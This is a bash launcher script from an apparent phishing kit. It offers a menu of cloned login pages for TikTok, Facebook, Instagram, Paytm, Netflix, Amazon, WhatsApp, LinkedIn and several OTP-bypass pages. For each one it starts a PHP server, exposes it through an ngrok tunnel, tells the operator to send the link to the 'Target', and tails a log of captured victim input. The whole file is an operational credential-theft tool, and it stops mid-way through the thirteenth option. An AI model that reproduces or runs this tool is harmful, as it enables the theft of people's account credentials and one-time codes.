#!/bin/bash
clear
echo ""
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m NGROK SERVER :\e[1;32m TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
sleep 4
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;40m\e[10m ARE YOU READY TO EAT YOUT BAIT ? \e[1;32m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
cat Logo.txt | lolcat
echo ""
echo ""
 
                 echo -e $'\e[1;33m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;96m      -------------------  \e[1;33m  [ *** ]\e[0m'   
                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m || -  Enter Your Choice - ||\e[1;91m  > > \e[0m' option
                 echo ""
		  if [ $option = 01 ] || [ $option = 1 ]
                  then 
			 
                           cd sites/ 
                           cd tiktok/
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 25
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           clear
                           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 

                
	          break;
                  elif [ $option = 02 ] || [ $option = 2 ]
	          then
	                   cd sites/
                           cd facebook/         
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 25
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           clear
                           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 


                  break;
                  elif [ $option = 03 ] || [ $option = 3 ]
	          then
                           cd sites/
                           cd instagram/
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 25
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           clear
                           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 
                  
                 
 
                  
                 break;
                 elif [ $option = 04 ] || [ $option = 4 ]
	         then
                           cd sites/
                           cd UberEats-Phishing/
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 25
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           clear
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 
                  
                  
                  
                break;
                elif [ $option = 05 ] || [ $option = 5 ]
	        then 
                           cd sites/
                           cd ola-otpbypass/
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 25
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           clear
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 
                  
                 break;
                 elif [ $option = 06 ] || [ $option = 6 ]
	         then
                
                           cd sites/
                           cd google-otp/
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                           sleep 25
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           clear
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 
                  


                break;
                elif [ $option = 07 ] || [ $option = 7 ]
	        then
                          clear
                          cd sites/
                          cd Paytm-Phishing/
                          echo 
                          echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign In \e[0m" 
			  echo
                          echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign UP \e[0m"
                          echo 
                          read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;92m Enter Your Choice : \e[0m' option1
		          if [ $option1 = 1 ] || [ $option1 = 01 ]
			  then
                          
                          cd paytm/
                          echo ""
                          echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                          echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                          echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                          sleep 25
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                          clear
                          echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                          printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt 

                   else
   
                         cd signup/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt 
                fi
                 
                break;

                elif [ $option = 08 ] || [ $option = 8 ]
	        then

                         cd sites/
                         cd Netflix/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                

                break;
                
                elif [ $option = 09 ] || [ $option = 9 ]
	        then

                         cd sites/
                         cd instafollow/
                         echo ""
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
                    

                break;
                elif [ $option = 10 ] || [ $option = 10 ]
	        then
                         cd sites/
                         cd amazonsign/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
      
                break;
                elif [ $option = 11 ] || [ $option = 11 ]
	        then
                         cd sites/
                         cd whatsapp-phishing/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
     

                break;
                elif [ $option = 12 ] || [ $option = 12 ]
	        then
                         cd sites/
                         cd Linkedin/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                

                break;
                elif [ $option = 13 ] || [ $option = 13 ]
	        then
                         cd sites/
                         cd Hotstar-otp-bypass/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
